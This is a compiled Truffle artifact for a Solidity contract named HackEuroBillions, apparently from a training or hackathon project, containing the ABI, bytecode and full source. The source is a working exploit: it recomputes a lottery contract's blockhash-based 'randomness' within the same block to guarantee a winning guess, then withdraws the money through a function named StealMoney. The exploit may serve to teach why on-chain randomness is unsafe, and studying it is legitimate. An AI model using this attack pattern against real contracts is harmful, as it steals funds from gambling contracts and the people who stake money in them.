{
  "contractName": "HackEuroBillions",
  "abi": [
    {
      "inputs": [
        {
          "name": "contractAddress",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "pseudo",
          "type": "string"
        }
      ],
      "name": "register",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "playerBet",
          "type": "uint256"
        }
      ],
      "name": "CheatPlay",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "value",
          "type": "uint256"
        }
      ],
      "name": "StealMoney",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "getBalance",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506040516020806104e783398101806040528101908080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610464806100836000396000f300608060405260043610610061576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168062029e3d1461006357806312065fe014610090578063ec8fa4c3146100bb578063f2c298be146100e8575b005b34801561006f57600080fd5b5061008e60048036038101908080359060200190929190505050610144565b005b34801561009c57600080fd5b506100a5610236565b6040518082815260200191505060405180910390f35b3480156100c757600080fd5b506100e660048036038101908080359060200190929190505050610255565b005b610142600480360381019080803590602001908201803590602001908080601f0160208091040260200160405190810160405280939291908181526020018383808284378201915050505050509192919290505050610327565b005b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633b9056bf826040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040180828152602001915050600060405180830381600087803b1580156101d457600080fd5b505af11580156101e8573d6000803e3d6000fd5b505050503373ffffffffffffffffffffffffffffffffffffffff166108fc829081150290604051600060405180830381858888f19350505050158015610232573d6000803e3d6000fd5b5050565b60003073ffffffffffffffffffffffffffffffffffffffff1631905090565b600080600143034060019004915060258281151561026f57fe5b0690506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16637bc49a9584836040518363ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004018083815260200182815260200192505050600060405180830381600087803b15801561030a57600080fd5b505af115801561031e573d6000803e3d6000fd5b50505050505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663f2c298be34836040518363ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004018080602001828103825283818151815260200191508051906020019080838360005b838110156103d15780820151818401526020810190506103b6565b50505050905090810190601f1680156103fe5780820380516001836020036101000a031916815260200191505b50925050506000604051808303818588803b15801561041c57600080fd5b505af1158015610430573d6000803e3d6000fd5b5050505050505600a165627a7a723058209c0c1977bed5fefd5c74ac7b4d91973d5320804cbb12d175c8c4610a8004028a0029",
  "source": "pragma solidity ^0.4.0;\r\n\r\nimport \"./EuroBillions.sol\";\r\n\r\ncontract HackEuroBillions {\r\n    // Instance of the real contract.\r\n    EuroBillions _euroBillions;\r\n\r\n    constructor(address contractAddress) public {\r\n        _euroBillions = EuroBillions(contractAddress);\r\n    }\r\n\r\n    // Smart contract should register (instead of user).\r\n    function register(string memory pseudo) public payable {\r\n        _euroBillions.register.value(msg.value)(pseudo);\r\n    }\r\n       \r\n    function CheatPlay(uint playerBet) public {\r\n        // Mimick original contract \"randomness\".\r\n        uint256 blockValue = uint256(blockhash(block.number-1));\r\n        uint guessedNumber = (blockValue % 37);\r\n\r\n        // This call will be mined in same block!\r\n        _euroBillions.play(playerBet, guessedNumber);\r\n    }\r\n\r\n    function StealMoney(uint value) public {\r\n        _euroBillions.userWithdraw(value);\r\n        msg.sender.transfer(value);\r\n    }\r\n\r\n    function () public payable {\r\n    }\r\n\r\n    function getBalance() public view returns (uint) {\r\n        return address(this).balance;\r\n    }\r\n}",
  "sourcePath": "C:/Data/Sources/Ethereum/open-rdays-4/contracts/HackEuroBillions.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.26+commit.4563c3fc.Emscripten.clang"
  },
  "schemaVersion": "3.0.9",
  "updatedAt": "2019-05-23T12:04:14.828Z",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}